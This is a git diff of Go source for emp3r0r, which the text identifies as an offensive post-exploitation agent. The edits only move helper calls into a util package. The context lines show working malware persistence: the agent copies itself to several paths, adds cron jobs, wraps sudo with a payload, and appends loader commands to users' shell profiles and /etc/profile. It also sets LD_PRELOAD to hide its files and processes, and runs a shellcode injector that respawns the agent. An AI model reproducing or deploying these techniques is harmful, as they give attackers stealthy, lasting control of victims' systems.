@@ -9,6 +9,8 @@ import (
 	"os/exec"
 	"os/user"
 	"strings"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // TODO implement more methods
@@ -57,7 +59,7 @@ var (
 // SelfCopy copy emp3r0r to multiple locations
 func SelfCopy() {
 	for _, path := range EmpLocations {
-		err := Copy(os.Args[0], path)
+		err := util.Copy(os.Args[0], path)
 		if err != nil {
 			log.Print(err)
 			continue
@@ -77,7 +79,7 @@ func PersistAllInOne() (err error) {
 }
 
 func cronJob() (err error) {
-	err = Copy(os.Args[0], "bash")
+	err = util.Copy(os.Args[0], "bash")
 	if err != nil {
 		return
 	}
@@ -134,12 +136,12 @@ func profiles() (err error) {
 	loader += fmt.Sprintf("\nfunction sudo() { `which sudo` $@; (set +m;(%s)) }", sudoPayload)
 	err = ioutil.WriteFile(user.HomeDir+"/.bashprofile", []byte(loader), 0644)
 	if err != nil {
-		if !IsFileExist(user.HomeDir) {
+		if !util.IsFileExist(user.HomeDir) {
 			err = ioutil.WriteFile("/etc/bash_profile", []byte(loader), 0644)
 			if err != nil {
 				return fmt.Errorf("No HomeDir found, and cannot write elsewhere: %v", err)
 			}
-			err = AppendToFile("/etc/profile", "source /etc/bash_profile")
+			err = util.AppendToFile("/etc/profile", "source /etc/bash_profile")
 			return fmt.Errorf("This user has no home dir: %v", err)
 		}
 		return
@@ -156,10 +158,10 @@ func profiles() (err error) {
 		return
 	}
 	// infect all profiles
-	_ = AppendToFile(user.HomeDir+"/.profile", sourceCmd)
-	_ = AppendToFile(user.HomeDir+"/.bashrc", sourceCmd)
-	_ = AppendToFile(user.HomeDir+"/.zshrc", sourceCmd)
-	_ = AppendToFile("/etc/profile", "source "+user.HomeDir+"/.bashprofile")
+	_ = util.AppendToFile(user.HomeDir+"/.profile", sourceCmd)
+	_ = util.AppendToFile(user.HomeDir+"/.bashrc", sourceCmd)
+	_ = util.AppendToFile(user.HomeDir+"/.zshrc", sourceCmd)
+	_ = util.AppendToFile("/etc/profile", "source "+user.HomeDir+"/.bashprofile")
 
 	return
 }
@@ -167,7 +169,7 @@ func profiles() (err error) {
 // add libemp3r0r.so to LD_PRELOAD
 // our files and processes will be hidden from common system utilities
 func ldPreload() error {
-	if !IsFileExist(Libemp3r0rFile) {
+	if !util.IsFileExist(Libemp3r0rFile) {
 		return fmt.Errorf("%s does not exist! Try module vaccine?", Libemp3r0rFile)
 	}
 	if os.Geteuid() == 0 {
@@ -180,7 +182,7 @@ func ldPreload() error {
 		log.Print(err)
 		return err
 	}
-	return AppendToFile(u.HomeDir+"/.profile", "\nexport LD_PRELOAD="+Libemp3r0rFile)
+	return util.AppendToFile(u.HomeDir+"/.profile", "\nexport LD_PRELOAD="+Libemp3r0rFile)
 }
 
 // AddCronJob add a cron job without terminal
@@ -196,7 +198,7 @@ func AddCronJob(job string) error {
 func injector() (err error) {
 	// this shellcode forks a process and executes emp3r0r agent
 	// https://github.com/jm33-m0/emp3r0r/blob/master/shellcode/guardian.asm
-	err = Copy(os.Args[0], GuardianAgentPath)
+	err = util.Copy(os.Args[0], GuardianAgentPath)
 	if err != nil {
 		return
 	}
